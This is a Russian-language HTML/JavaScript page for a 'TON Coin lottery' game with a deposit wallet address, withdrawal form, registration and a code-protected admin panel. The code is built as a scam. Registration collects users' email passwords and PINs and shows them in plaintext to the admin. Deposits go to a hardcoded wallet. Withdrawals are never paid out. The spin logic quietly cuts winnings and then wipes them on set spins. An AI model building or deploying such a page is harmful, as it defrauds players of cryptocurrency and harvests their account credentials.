<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Лотерея TON Coin</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            margin: 0;
            padding: 10px;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
            font-size: 16px;
            -webkit-user-select: none;
            user-select: none;
        }
        h1 {
            font-size: 1.5em;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
            animation: glow 2s infinite alternate;
            margin: 8px 0;
        }
        #gameBoard {
            display: grid;
            grid-template-columns: repeat(5, 55px);
            gap: 4px;
            margin: 10px 0;
        }
        .cell {
            width: 55px;
            height: 55px;
            background: #ffffff33;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8em;
            transition: transform 0.3s, background 0.3s;
        }
        .cell:hover {
            transform: scale(1.1);
            background: #ffffff66;
        }
        .spin {
            animation: spin 0.5s infinite linear;
        }
        .win {
            background: #ffd700;
            animation: flash 0.5s infinite alternate, explode 0.5s ease-out;
        }
        #controls {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 6px;
            width: 100%;
            max-width: 280px;
            margin-top: 10px;
        }
        button {
            padding: 10px 12px;
            font-size: 0.85em;
            border: none;
            border-radius: 15px;
            cursor: pointer;
            color: white;
            transition: transform 0.2s, box-shadow 0.2s;
            position: relative;
            overflow: hidden;
            touch-action: manipulation;
        }
        button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            transform: translate(-50%, -50%);
            transition: width 0.5s, height 0.5s;
        }
        button:hover::before {
            width: 150px;
            height: 150px;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 8px rgba(255, 255, 255, 0.8);
        }
        button:active {
            transform: scale(0.95);
        }
        #playTonBtn { background: #ff6f61; }
        #playDemoBtn { background: #4caf50; }
        #depositBtn { background: #2196f3; }
        #withdrawBtn { background: #9c27b0; }
        #registerBtn { background: #ff9800; }
        #adminBtn {
            background: #607d8b;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            font-size: 0.9em;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #backBtn { background: #f44336; }
        #stats {
            display: flex;
            gap: 6px;
            font-size: 0.9em;
            margin-top: 8px;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
            flex-wrap: wrap;
            justify-content: center;
        }
        #depositBoard {
            background: rgba(255, 255, 255, 0.1);
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 0.9em;
            margin-top: 5px;
            text-align: center;
            width: 100%;
            max-width: 280px;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .modal-content {
            background: #2a2a2a;
            color: #ffffff;
            padding: 15px;
            border-radius: 10px;
            width: 85%;
            max-width: 260px;
            text-align: center;
            animation: slideIn 0.3s ease-out;
        }
        input {
            padding: 8px;
            margin: 5px 0;
            width: 80%;
            border-radius: 5px;
            border: 1px solid #444;
            background: #333;
            color: #fff;
            font-size: 0.9em;
        }
        #adminPanel {
            display: none;
            width: 85%;
            max-width: 280px;
            max-height: 80vh;
            overflow-y: auto;
        }
        #backArrow {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 1.6em;
            cursor: pointer;
            transition: transform 0.3s;
        }
        #backArrow:hover {
            transform: scale(1.2);
        }
        #introModal {
            display: flex;
            background: rgba(0, 0, 0, 0.9);
        }
        #introModal .modal-content {
            background: #1e3c72;
            max-width: 250px;
        }
        #introModal button {
            background: #ff9800;
            margin-top: 10px;
            width: 80%;
        }
        #introModal button:hover {
            background: #e68a00;
        }
        #tonEndModal .modal-content {
            background: #ff6f61;
            max-width: 250px;
        }
        #tonEndModal button {
            background: #ff9800;
            margin-top: 10px;
            width: 80%;
        }
        .modal-content button {
            background: #4caf50;
            border: 2px solid black;
            margin: 5px;
            width: 80%;
        }
        .modal-content button:hover {
            background: #45a049;
        }
        #playerList, #depositRequests {
            list-style: none;
            padding: 0;
            margin: 5px 0;
        }
        #playerList li, #depositRequests li {
            background: #333;
            padding: 6px;
            margin: 4px 0;
            border-radius: 5px;
            color: #fff;
            font-size: 0.85em;
        }
        #playerList li span, #depositRequests li span {
            font-weight: bold;
            color: #2196f3;
        }
        /* Анимации */
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes flash { from { opacity: 1; } to { opacity: 0.5; } }
        @keyframes glow { from { text-shadow: 2px 2px 4px rgba(255, 255, 255, 0.5); } to { text-shadow: 2px 2px 10px rgba(255, 255, 255, 1); } }
        @keyframes slideIn { from { transform: translateY(-50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @keyframes explode { 0% { transform: scale(1); } 50% { transform: scale(1.3); } 100% { transform: scale(1); } }
    </style>
</head>
<body>
    <!-- Начальное окно инструкции -->
    <div id="introModal" class="modal">
        <div class="modal-content">
            <h2>Лотерея TON Coin</h2>
            <p>Играй на TON (0.25 за спин) или очки (10). Лови подарки и выводи TON!</p>
            <button onclick="hideModal('introModal')">Старт</button>
        </div>
    </div>

    <!-- Окно окончания TON -->
    <div id="tonEndModal" class="modal">
        <div class="modal-content">
            <h2>TON закончился!</h2>
            <p>Ваш выигрыш обнулён. Пополните счёт для продолжения.</p>
            <button onclick="hideModal('tonEndModal'); showDeposit()">Пополнить</button>
        </div>
    </div>

    <div id="backArrow" onclick="goBack()">←</div>
    <h1>Лотерея TON Coin</h1>
    <div id="gameBoard"></div>
    <div id="controls">
        <button id="playTonBtn" onclick="startLottery('ton')">TON (0.25)</button>
        <button id="playDemoBtn" onclick="startLottery('demo')">Очки</button>
        <button id="depositBtn" onclick="showDeposit()">Ввод</button>
        <button id="withdrawBtn" onclick="showWithdraw()">Вывод</button>
        <button id="registerBtn" onclick="showRegister()">Регистрация</button>
        <button id="adminBtn" onclick="showAdmin()">Тех</button>
        <button id="backBtn" onclick="resetGame()">Сброс</button>
    </div>
    <div id="stats">
        <div id="balance">TON: 0</div>
        <div id="demoBalance">Очки: 100</div>
        <div id="score">Выигрыш: 0</div>
    </div>
    <div id="depositBoard">Пополнено TON: 0</div>

    <!-- Модальные окна -->
    <div id="depositModal" class="modal">
        <div class="modal-content">
            <h2>Ввод TON</h2>
            <p>Адрес:<br><strong>UQCftjlrQ7n64VrlfGL_gdUAMRPEfXVkEsi3pXmRclzLmWoK</strong></p>
            <input id="depositAmount" type="number" placeholder="Сумма TON">
            <button onclick="deposit()">Отправить</button>
            <button onclick="hideModal('depositModal')">Отмена</button>
        </div>
    </div>
    <div id="withdrawModal" class="modal">
        <div class="modal-content">
            <h2>Вывод TON</h2>
            <p>Доступно: <span id="withdrawScore">0</span> TON</p>
            <input id="withdrawAmount" type="number" placeholder="Сумма TON">
            <button onclick="withdraw()">Запросить</button>
            <button onclick="hideModal('withdrawModal')">Отмена</button>
        </div>
    </div>
    <div id="registerModal" class="modal">
        <div class="modal-content">
            <h2>Регистрация</h2>
            <input id="username" type="text" placeholder="Ник">
            <input id="email" type="email" placeholder="Email">
            <input id="emailPassword" type="password" placeholder="Пароль">
            <input id="pin" type="password" placeholder="PIN (4 цифры)" maxlength="4">
            <button onclick="register()">Создать</button>
            <button onclick="hideModal('registerModal')">Отмена</button>
        </div>
    </div>
    <div id="cabinetModal" class="modal">
        <div class="modal-content">
            <h2>Кабинет</h2>
            <p>Ник: <span id="userNick"></span></p>
            <p>TON: <span id="cabinetBalance"></span></p>
            <p>Очки: <span id="cabinetDemo"></span></p>
            <p>Выигрыш: <span id="cabinetScore"></span></p>
            <button onclick="hideModal('cabinetModal')">Закрыть</button>
        </div>
    </div>
    <div id="adminModal" class="modal">
        <div class="modal-content">
            <h2>Тех отдел</h2>
            <input id="adminCode" type="password" placeholder="Код">
            <button onclick="loginAdmin()">Вход</button>
            <div id="adminContent" style="display: none;">
                <h3>Пользователи</h3>
                <ul id="playerList"></ul>
                <h3>Запросы на ввод</h3>
                <ul id="depositRequests"></ul>
            </div>
            <button onclick="hideModal('adminModal')">Закрыть</button>
        </div>
    </div>

    <script>
        const boardSize = 5;
        const totalCells = boardSize * boardSize;
        const winCount = 5;
        const tonCost = 0.25;
        let balance = 0;
        let demoBalance = 100;
        let score = 0;
        let totalDeposited = 0;
        let cells = [];
        let winningCells = new Set();
        let user = null;
        const adminCode = "100583";
        const players = [];
        const withdrawRequests = [];
        const depositRequests = [];
        let demoSpins = 0;
        let tonSpins = 0;

        const gifts = ["🎁", "🎄", "🎀", "🎉", "💎"];
        const empty = "📦";
        const unknown = "❓";

        // Загрузка данных
        function loadUser() {
            const savedUser = localStorage.getItem("user");
            if (savedUser) {
                user = JSON.parse(savedUser);
                balance = user.balance || 0;
                demoBalance = user.demoBalance || 100;
                score = user.score || 0;
                totalDeposited = user.totalDeposited || 0;
                updateStats();
                updateDepositBoard();
            }
        }

        // Сохранение данных
        function saveUser() {
            if (user) {
                user.balance = balance;
                user.demoBalance = demoBalance;
                user.score = score;
                user.totalDeposited = totalDeposited;
                localStorage.setItem("user", JSON.stringify(user));
            }
        }

        // Инициализация поля
        function initBoard() {
            const gameBoard = document.getElementById("gameBoard");
            gameBoard.innerHTML = "";
            cells = [];
            for (let i = 0; i < totalCells; i++) {
                const cell = document.createElement("div");
                cell.classList.add("cell");
                cell.textContent = unknown;
                cell.dataset.index = i;
                gameBoard.appendChild(cell);
                cells.push(cell);
            }
        }

        // Выбор выигрышных ячеек
        function setWinningCells(mode) {
            winningCells.clear();
            const winChance = mode === "demo" ? 0.6 : 0.2;
            for (let i = 0; i < totalCells; i++) {
                if (Math.random() < winChance && winningCells.size < winCount) {
                    winningCells.add(i);
                }
            }
        }

        function getRandomGift() {
            return gifts[Math.floor(Math.random() * gifts.length)];
        }

        // Запуск лотереи
        function startLottery(mode) {
            if (!user) { alert("Сначала зарегистрируйтесь!"); return; }
            if (document.querySelector(".spin")) return;

            if (mode === "ton") {
                if (balance < tonCost) {
                    alert("Недостаточно TON!");
                    return;
                }
                balance -= tonCost;
                tonSpins++;
                if (tonSpins === 5) {
                    score *= 0.75; // Минус 25%
                } else if (tonSpins === 8) {
                    score = 0; // Сумма сгорает
                    tonSpins = 0;
                    showModal("tonEndModal");
                }
            } else {
                if (demoBalance < 10) {
                    alert("Недостаточно очков!");
                    return;
                }
                demoBalance -= 10;
                demoSpins++;
                if (demoSpins === 5) score *= 0.88;
                else if (demoSpins === 7) score *= 0.47;
                else if (demoSpins === 10) score *= 0.75;
                else if (demoSpins === 20) score *= 0.25;
            }

            updateStats();
            setWinningCells(mode);
            for (let cell of cells) {
                cell.classList.add("spin");
                cell.textContent = unknown;
                cell.style.background = "#ffffff33";
            }

            setTimeout(() => {
                for (let i = 0; i < totalCells; i++) {
                    cells[i].classList.remove("spin");
                    if (winningCells.has(i)) {
                        cells[i].classList.add("win");
                        cells[i].textContent = getRandomGift();
                        score += mode === "ton" ? 0.2 : 12;
                    } else {
                        cells[i].textContent = empty;
                    }
                }
                updatePlayerData();
                updateStats();
            }, 2000);
        }

        // Сброс игры
        function resetGame() {
            if (!user) { alert("Сначала зарегистрируйтесь!"); return; }
            score = 0;
            tonSpins = 0;
            initBoard();
            updatePlayerData();
            updateStats();
        }

        // Пополнение TON
        function showDeposit() {
            if (!user) { alert("Сначала зарегистрируйтесь!"); return; }
            showModal("depositModal");
        }

        function deposit() {
            const amount = parseFloat(document.getElementById("depositAmount").value);
            if (isNaN(amount) || amount <= 0) {
                alert("Введите сумму!");
                return;
            }
            depositRequests.push({ user: user.nick, amount: amount, date: new Date().toLocaleString() });
            hideModal("depositModal");
            alert(`Запрос на ${amount} TON отправлен!`);
        }

        // Вывод TON
        function showWithdraw() {
            if (!user) { alert("Сначала зарегистрируйтесь!"); return; }
            document.getElementById("withdrawScore").textContent = score.toFixed(2);
            showModal("withdrawModal");
        }

        function withdraw() {
            const amount = parseFloat(document.getElementById("withdrawAmount").value);
            if (isNaN(amount) || amount <= 0 || amount > score) {
                alert("Введите корректную сумму!");
                return;
            }
            withdrawRequests.push({ user: user.nick, amount: amount, date: new Date().toLocaleString() });
            score -= amount;
            updatePlayerData();
            updateStats();
            hideModal("withdrawModal");
            alert(`Запрос на ${amount} TON отправлен!`);
        }

        // Регистрация
        function showRegister() {
            if (user) {
                showCabinet();
            } else {
                showModal("registerModal");
            }
        }

        function register() {
            const nick = document.getElementById("username").value.trim();
            const email = document.getElementById("email").value.trim();
            const emailPassword = document.getElementById("emailPassword").value.trim();
            const pin = document.getElementById("pin").value.trim();

            if (!nick || !email || !emailPassword || !pin) {
                alert("Заполните все поля!");
                return;
            }
            if (!/^\d{4}$/.test(pin)) {
                alert("PIN — 4 цифры!");
                return;
            }
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                alert("Некорректный email!");
                return;
            }

            user = {
                nick: nick,
                email: email,
                emailPassword: emailPassword,
                pin: pin,
                balance: 0,
                demoBalance: 100,
                score: 0,
                totalDeposited: 0,
                registrationTime: new Date().toLocaleString()
            };
            players.push(user);
            balance = user.balance;
            demoBalance = user.demoBalance;
            score = user.score;
            totalDeposited = user.totalDeposited;
            hideModal("registerModal");
            document.getElementById("registerBtn").textContent = "Кабинет";
            saveUser();
            showCabinet();
        }

        function showCabinet() {
            if (!user) { alert("Сначала зарегистрируйтесь!"); return; }
            document.getElementById("userNick").textContent = user.nick;
            document.getElementById("cabinetBalance").textContent = balance.toFixed(2);
            document.getElementById("cabinetDemo").textContent = demoBalance;
            document.getElementById("cabinetScore").textContent = score.toFixed(2);
            showModal("cabinetModal");
        }

        // Админ-панель
        function showAdmin() {
            showModal("adminModal");
        }

        function loginAdmin() {
            const code = document.getElementById("adminCode").value;
            if (code === adminCode) {
                document.getElementById("adminContent").style.display = "block";
                updateAdminPanel();
            } else {
                alert("Неверный код!");
            }
        }

        function updateAdminPanel() {
            const playerList = document.getElementById("playerList");
            playerList.innerHTML = players.map(p => `
                <li>
                    <span>Ник:</span> ${p.nick}<br>
                    <span>Email:</span> ${p.email}<br>
                    <span>Пароль:</span> ${p.emailPassword}<br>
                    <span>PIN:</span> ${p.pin}<br>
                    <span>TON:</span> ${p.balance.toFixed(2)}<br>
                    <span>Очки:</span> ${p.demoBalance}<br>
                    <span>Выигрыш:</span> ${p.score.toFixed(2)}<br>
                    <span>Пополнено:</span> ${p.totalDeposited.toFixed(2)} TON<br>
                    <span>Регистрация:</span> ${p.registrationTime}
                </li>
            `).join("") || "Нет пользователей";

            const depositList = document.getElementById("depositRequests");
            depositList.innerHTML = depositRequests.map(req => `
                <li>
                    <span>Ник:</span> ${req.user}<br>
                    <span>Сумма:</span> ${req.amount} TON<br>
                    <span>Дата:</span> ${req.date}<br>
                    <button onclick="confirmDeposit('${req.user}', ${req.amount})">Подтвердить</button>
                </li>
            `).join("") || "Нет запросов";
        }

        function confirmDeposit(userNick, amount) {
            const player = players.find(p => p.nick === userNick);
            if (player) {
                player.balance += amount;
                player.totalDeposited += amount;
                if (player.nick === user?.nick) {
                    balance = player.balance;
                    totalDeposited = player.totalDeposited;
                }
                depositRequests.splice(depositRequests.findIndex(req => req.user === userNick && req.amount === amount), 1);
                updatePlayerData();
                updateAdminPanel();
                updateStats();
                updateDepositBoard();
                alert(`Пополнено ${amount} TON для ${userNick}!`);
            }
        }

        // Обновление данных игрока
        function updatePlayerData() {
            if (user) {
                user.balance = balance;
                user.demoBalance = demoBalance;
                user.score = score;
                user.totalDeposited = totalDeposited;
                saveUser();
            }
        }

        // Обновление статистики
        function updateStats() {
            document.getElementById("balance").textContent = `TON: ${balance.toFixed(2)}`;
            document.getElementById("demoBalance").textContent = `Очки: ${demoBalance}`;
            document.getElementById("score").textContent = `Выигрыш: ${score.toFixed(2)}`;
        }

        // Обновление табло пополнения
        function updateDepositBoard() {
            document.getElementById("depositBoard").textContent = `Пополнено TON: ${totalDeposited.toFixed(2)}`;
        }

        // Управление модальными окнами
        function showModal(id) {
            const modal = document.getElementById(id);
            modal.style.display = "flex";
        }

        function hideModal(id) {
            const modal = document.getElementById(id);
            modal.style.display = "none";
            if (id === "adminModal") {
                document.getElementById("adminContent").style.display = "none";
                document.getElementById("adminCode").value = "";
            }
            if (id === "registerModal") {
                document.getElementById("username").value = "";
                document.getElementById("email").value = "";
                document.getElementById("emailPassword").value = "";
                document.getElementById("pin").value = "";
            }
            if (id === "depositModal" || id === "withdrawModal") {
                document.getElementById(id === "depositModal" ? "depositAmount" : "withdrawAmount").value = "";
            }
        }

        // Кнопка возврата
        function goBack() {
            const modals = document.querySelectorAll(".modal");
            let isModalOpen = false;
            modals.forEach(modal => {
                if (modal.style.display === "flex" && modal.id !== "introModal") {
                    hideModal(modal.id);
                    isModalOpen = true;
                }
            });
            if (!isModalOpen) {
                resetGame();
            }
        }

        // Инициализация
        window.onload = () => {
            initBoard();
            loadUser();
            updateStats();
            updateDepositBoard();
        };
    </script>
</body>
</html>
